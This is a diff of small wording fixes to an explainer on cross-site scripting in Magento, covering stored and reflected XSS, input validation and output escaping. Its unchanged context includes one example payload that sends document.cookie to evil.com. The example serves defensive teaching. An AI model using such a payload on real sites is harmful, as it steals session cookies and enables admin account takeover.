@@ -14,7 +14,7 @@ XSS is an abbreviation which stands for "Cross Site Scripting". It is a classifi
 
 ### The Idea
 
-The idea behind XSS, is that an attacker executes unauthorized malicious scripts in the context of another user's session. I find the name "cross site scripting" a bit misleading as there is not always a "cross site" involved in the attack. Often the malicious scripting is handled inline, rather than a `<script>` referencing an external site ("cross site"). As such, I prefer the name "script injection". However, this type of attack is universally known as XSS, so that's the name I'll use here.
+The idea behind XSS, is that an attacker executes unauthorized malicious scripts in the context of another user's session. I find the name "cross site scripting" a bit misleading as there is not always a "cross site" involved in the attack. Often the malicious scripting is handled inline, rather than via a `<script>` tag referencing an external site ("cross site"). As such, I prefer the name "script injection". However, this type of attack is universally known as XSS, so that's the name I'll use here.
 
 ### An Example
 
@@ -40,7 +40,7 @@ If Magento did nothing to protect against XSS, this would get stored in the data
 
 Again, if Magento took no action to prevent against XSS \<script>document.write('\<img src="http://evil.com/?cookie=' + document.cookie + '">')\</script> would not be rendered as text, but would actually be executed as JavaScript. This script would add an image to the page that would wind up sending a request to evil.com (presumably a site controlled by the attacker) along with the admininstrator's cookie.
 
-Then, the attacker would be able to access the Magento admin panel without any authentication, simply by supplying the administrator cookie with their request.
+Then, the attacker would be able to access the victim's Magento admin panel without any authentication, simply by supplying the administrator cookie with their request.
 
 ### What Can Unauthorized Scripts Do
 
@@ -72,7 +72,7 @@ There are two solutions for XSS, input validation and output escaping. For examp
 
 In this example, however, search queries including the string \<script> **are** considered valid queries by Magento. So the next solution is output escaping.
 
-The idea here is to convert the word `<script>` to `&lt;script&gt` before outputing. Then, when rendered by the browser the user will see the word "\<script>" as a string of text and the script will not be executed. This strategy is employed by Magento to protect against both the stored, and reflected example described earlier.
+The idea here is to convert the word `<script>` to `&lt;script&gt` before outputing. Then, when rendered by the browser the user will see the word "\<script>" as a string of text and the script will not be executed. This strategy is employed by Magento to protect against both the stored, and reflected examples described earlier.
 
 Input validation and output escaping are not mutually exclusive. You should be doing both.
 
